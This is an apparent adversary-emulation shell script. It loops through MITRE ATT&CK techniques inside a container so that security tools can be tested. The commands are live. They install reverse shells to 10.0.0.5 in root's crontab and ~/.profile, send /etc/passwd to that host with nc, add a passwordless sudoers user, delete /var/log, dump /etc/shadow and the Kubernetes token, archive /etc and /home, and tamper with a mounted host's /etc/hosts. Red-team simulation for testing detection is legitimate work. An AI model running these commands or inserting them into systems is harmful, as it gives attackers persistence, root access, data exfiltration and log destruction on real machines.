#!/usr/bin/env sh
# TTP execution in a loop 
# Add detection and logging mechanisms in your environment and see how your security tools respond.
# ANSI colors for clarity
GREEN="\033[1;32m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"
ITERATIONS="${ITERATIONS:-0}"   # 0 means infinite loop
COUNTER=0

echo -e "${BLUE}[INFO] Starting MITRE ATT&CK TTP simulation in container environment${RESET}"

# Helper function to randomize sleep between actions
random_sleep() {
    SECS=$((RANDOM % 5 + 2))
    sleep $SECS
}

while [ "$ITERATIONS" -eq 0 ] || [ $COUNTER -lt $ITERATIONS ]
do
    echo -e "${YELLOW}[CYCLE $COUNTER] Beginning new round of TTP simulations...${RESET}"
    random_sleep

    # === Initial Access / Execution Simulation ===
    # T1059: Command and Scripting Interpreter - run a suspicious shell command
    echo -e "${GREEN}[+] Executing a suspicious shell command...${RESET}"
    bash -c "echo 'Suspicious initial access via bash'"

    random_sleep

    # === Persistence ===
    # T1053.003: Cron Job for Persistence
    echo -e "${GREEN}[+] Adding a cron job for persistence...${RESET}"
    echo "* * * * * root /bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1" >> /etc/crontabs/root

    random_sleep

    # T1547: Adding a malicious script to shell profiles for persistence
    echo -e "${GREEN}[+] Adding malicious payload to ~/.profile...${RESET}"
    echo "/bin/sh -i >& /dev/tcp/10.0.0.5/5555 0>&1" >> ~/.profile

    random_sleep

    # === Privilege Escalation ===
    # T1078: Valid Accounts (simulate adding a user to /etc/sudoers)
    echo -e "${GREEN}[+] Modifying sudoers to escalate privileges...${RESET}"
    echo "eviluser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers || echo -e "${RED}[!] Failed to escalate privileges${RESET}"

    random_sleep

    # === Defense Evasion ===
    # T1070.004: Log File Deletion
    echo -e "${GREEN}[+] Removing log files to evade detection...${RESET}"
    rm -rf /var/log/* || echo -e "${RED}[!] Failed to remove logs${RESET}"

    random_sleep

    # T1564: Hide Artifacts
    echo -e "${GREEN}[+] Changing permissions to hide sensitive files...${RESET}"
    chmod 600 /etc/shadow || echo -e "${RED}[!] Failed to hide credentials${RESET}"

    random_sleep

    # === Credential Access ===
    # T1003: OS Credential Dumping (simulate reading shadow file)
    echo -e "${GREEN}[+] Attempting to dump credentials from /etc/shadow...${RESET}"
    cat /etc/shadow || echo -e "${RED}[!] Failed to read /etc/shadow${RESET}"

    random_sleep

    # T1552.001: Credentials in Files (simulate searching for passwords)
    echo -e "${GREEN}[+] Searching for passwords in bash history...${RESET}"
    grep -i password ~/.bash_history || echo -e "${RED}[!] No stored credentials found in history${RESET}"

    random_sleep

    # === Discovery ===
    # T1082: System Information Discovery
    echo -e "${GREEN}[+] Gathering system info (uname, ifconfig, ps, ls)...${RESET}"
    uname -a
    ifconfig -a
    ps aux
    ls -alh /etc

    random_sleep

    # T1016: System Network Configuration Discovery
    echo -e "${GREEN}[+] Checking network configuration...${RESET}"
    ip addr show || ifconfig

    random_sleep

    # === Lateral Movement ===
    # T1021: Remote Services (simulate SSH attempts)
    echo -e "${GREEN}[+] Attempting lateral movement via SSH...${RESET}"
    ssh -o StrictHostKeyChecking=no user@target-machine "echo 'Lateral movement attempt'" || echo -e "${RED}[!] SSH lateral movement failed${RESET}"

    random_sleep

    # === Collection ===
    # T1560: Archive Collected Data
    echo -e "${GREEN}[+] Collecting and archiving data for exfiltration...${RESET}"
    tar -czvf collected_data_$COUNTER.tar.gz /etc /home

    random_sleep

    # T1041: Exfiltration Over C2 Channel (simulate sending files via netcat)
    echo -e "${GREEN}[+] Simulating exfiltration of /etc/passwd...${RESET}"
    cat /etc/passwd | nc 10.0.0.5 6666 || echo -e "${RED}[!] Exfiltration failed${RESET}"

    random_sleep

    # === Impact ===
    # T1485: Data Destruction (simulate removing sensitive directories)
    echo -e "${GREEN}[+] Simulating data destruction on temp directories...${RESET}"
    rm -rf /tmp/* /var/tmp/*

    random_sleep

    # T1486: Data Encrypted for Impact (simulate encryption)
    echo -e "${GREEN}[+] Simulating encryption of sensitive data...${RESET}"
    tar -cf sensitive_data_$COUNTER.tar /important_dir 2>/dev/null
    openssl enc -aes-256-cbc -salt -in sensitive_data_$COUNTER.tar -out sensitive_data_$COUNTER.enc -k supersecret || echo -e "${RED}[!] Encryption failed${RESET}"

    random_sleep

    # === Container/Kubernetes Specific TTPs ===
    # T1613: Container and Resource Discovery
    echo -e "${GREEN}[+] Attempting to discover container details and K8s service accounts...${RESET}"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "Found serviceaccount token" || echo -e "${RED}[!] No SA token found${RESET}"
    ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null

    random_sleep

    # Simulate K8s cluster enumeration (if 'kubectl' is present)
    if command -v kubectl >/dev/null; then
        echo -e "${GREEN}[+] Enumerating Kubernetes resources with kubectl...${RESET}"
        kubectl get pods --all-namespaces 2>/dev/null || echo -e "${RED}[!] Failed to list pods${RESET}"
        kubectl get svc --all-namespaces 2>/dev/null || echo -e "${RED}[!] Failed to list services${RESET}"
    else
        echo -e "${YELLOW}[~]\033[0m kubectl not found, skipping K8s enumeration..."
    fi

    random_sleep

    # Simulate container breakout attempts (writing to host paths - if mounted)
    echo -e "${GREEN}[+] Attempting container breakout scenario (if /host is mounted)...${RESET}"
    if [ -d "/host" ]; then
        # Attempt to manipulate host files
        echo "Malicious content" >> /host/etc/hosts || echo -e "${RED}[!] Breakout attempt failed${RESET}"
    else
        echo -e "${YELLOW}[~] No host mount found, skipping breakout attempt...${RESET}"
    fi

    random_sleep

    echo -e "${YELLOW}[CYCLE $COUNTER] Completed this round of TTP simulations.${RESET}"

    # Increment or loop
    COUNTER=$((COUNTER+1))
    [ "$ITERATIONS" -ne 0 ] && [ $COUNTER -ge $ITERATIONS ] && break

    # Optionally, wait a bit before the next iteration
    SLEEP_BETWEEN=$((RANDOM % 15 + 5))
    echo -e "${BLUE}[INFO]\033[0m Waiting ${SLEEP_BETWEEN}s before next cycle..."
    sleep $SLEEP_BETWEEN
done

echo -e "${BLUE}[INFO]\033[0m MITRE ATT&CK TTP simulation completed."